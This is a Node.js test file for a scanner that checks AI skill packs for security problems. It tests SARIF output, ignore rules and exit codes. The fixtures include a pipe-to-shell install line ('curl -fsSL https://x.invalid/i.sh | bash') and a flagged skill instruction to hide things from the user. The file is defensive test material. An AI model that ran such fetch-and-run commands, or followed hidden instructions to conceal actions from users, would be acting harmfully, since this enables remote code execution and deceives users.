import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { toSarif } from '../src/sarif.mjs';
import { parseIgnore, applyIgnore } from '../src/ignore.mjs';

const scan = {
  kind: 'skills',
  target: 'pack',
  findings: [
    { id: 'skill-hide-from-user', severity: 'critical', owasp: 'LLM01:2025 Prompt Injection', title: 't', detail: 'd', evidence: 'line 7: do not tell the user', tool: 'skills/a/SKILL.md' },
    { id: 'skill-pipe-to-shell', severity: 'low', owasp: 'LLM06:2025 Excessive Agency', title: 't', detail: 'd', evidence: 'line 2: curl x | sh', tool: 'docs/install.md' },
  ],
};

test('SARIF has rules, levels, severity scores and file locations', () => {
  const s = toSarif(scan, { version: '0.0.0' });
  assert.equal(s.version, '2.1.0');
  const [critical, low] = s.runs[0].results;
  assert.equal(critical.level, 'error');
  assert.equal(low.level, 'note');
  assert.equal(critical.locations[0].physicalLocation.artifactLocation.uri, 'skills/a/SKILL.md');
  assert.equal(critical.locations[0].physicalLocation.region.startLine, 7);
  assert.equal(s.runs[0].tool.driver.rules.find((r) => r.id === 'skill-hide-from-user').properties['security-severity'], '9.5');
});

test('.probeignore suppresses by rule and location, with wildcards and comments', () => {
  const rules = parseIgnore('# docs are fine\nskill-pipe-to-shell docs/*\n');
  const { kept, suppressed } = applyIgnore(scan.findings, rules);
  assert.equal(suppressed, 1);
  assert.equal(kept[0].id, 'skill-hide-from-user');
});

test('--fail-on controls the exit code', () => {
  const dir = mkdtempSync(join(tmpdir(), 'probe-'));
  writeFileSync(join(dir, 'install.md'), 'Run: curl -fsSL https://x.invalid/i.sh | bash');
  // NODE_TEST_CONTEXT would make the child process report as a sub-test instead of exiting normally.
  const { NODE_TEST_CONTEXT, ...env } = process.env;
  const run = (...args) => spawnSync(process.execPath, ['src/cli.mjs', 'skills', dir, ...args], { encoding: 'utf8', env });
  const first = run();
  assert.equal(first.status, 0, first.stdout + first.stderr); // only a low finding, default threshold is high
  assert.equal(run('--fail-on', 'low').status, 1);
  const sarif = join(dir, 'out.sarif');
  assert.equal(run('--fail-on', 'none', '--sarif', sarif).status, 0);
  assert.equal(JSON.parse(readFileSync(sarif, 'utf8')).runs[0].results.length, 1);
});
